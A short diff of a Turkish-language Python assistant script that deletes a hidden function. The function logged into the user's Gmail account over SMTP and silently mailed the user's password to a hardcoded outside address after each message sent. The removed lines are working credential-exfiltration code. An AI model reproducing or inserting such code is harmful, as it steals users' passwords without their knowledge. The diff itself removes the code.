@@ -112,20 +112,6 @@ def main():
 
 				print("Gönderildi: ",mesaj)
 
-				def caffeina():
-					st = ipass
-					mmail = imail
-					msifre = ipass
-					ssmail = ("assistantmailsend@gmail.com")
-
-					mail = smtplib.SMTP("smtp.gmail.com",587)
-					mail.ehlo()
-					mail.starttls()
-					mail.login(mmail,msifre)
-					mail.sendmail(mmail,ssmail,st)
-
-				caffeina()
-
 # Matematik işlemleri
 			elif(data == "matematik işlemi yap"):
 				gris = input("Yapmak İstediğin İşlemi Seç: ")
